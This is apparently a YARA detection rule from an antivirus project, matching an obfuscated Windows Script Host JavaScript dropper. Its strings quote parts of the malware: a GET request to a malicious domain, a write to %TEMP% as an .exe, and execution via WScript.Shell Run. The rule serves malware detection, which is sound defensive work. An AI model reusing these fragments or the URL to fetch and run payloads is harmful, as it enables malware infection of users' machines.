rule sig_20160328_b317659fb1986ad1df814fd0745d5917 {
  meta:
    description = "datamaliciousorder - file 20160328_b317659fb1986ad1df814fd0745d5917.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "278c224e6230dd7fa5df0df0b454e932893ad2165c9ee9e77933a89d31e5b10d"

  strings:
    $s1  = "function Clukbzcn() {return Lpumsxz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"8xi6isGYQ.exe\";};" fullword ascii
    $s2  = "do {WScript[Emttocwle](Eblzm() * 11)} while (Sqglbkvh[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Sqglbkvh[Ziqbjefiui](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s4  = "var Lpumsxz = function Cjzthbmm() {return WScript[Pjndjp](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Dccaar(Ayinhj, Ywbnhrjxm){return Ayinhj - Ywbnhrjxm;};" fullword ascii
    $s6  = "function Uufxldbjyu(Vgbis){Lpumsxz[\"Run\"](Vgbis, Khrqyfuvuo, Khrqyfuvuo);};" fullword ascii
    $s7  = "function Sgnbm() {return ((Ynzzw == true) && (Ynzzw == Jtyxng)) ? 1 : Khrqyfuvuo;};" fullword ascii
    $s8  = " while (Qjfvtmpj){" fullword ascii
    $s9  = "var Nbpqpfcyvr = new this[\"Date\"]();" fullword ascii
    $s10 = "function Kpbwu()" fullword ascii
    $s11 = "function Lpeibcquf(Cbjkzxk) {var Mwyfiqd = (1, 2, 3, 4, 5, Cbjkzxk); return Mwyfiqd;};" fullword ascii
    $s12 = "var Ynzzw = false;" fullword ascii
    $s13 = "function Eblzm(){return 22;};" fullword ascii
    $s14 = "var Jtyxng = false;" fullword ascii
    $s15 = "var Qpmhmkb = false;" fullword ascii
    $s16 = "Jtyxng = true; " fullword ascii
    $s17 = "function Nwknttxsi(){return Sicwymkfhm;};" fullword ascii
    $s18 = "function Fxczz(){return Pjndjp;};" fullword ascii
    $s19 = "Ynzzw = true; " fullword ascii
    $s20 = "} catch(Ifqnf){Qjfvtmpj = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}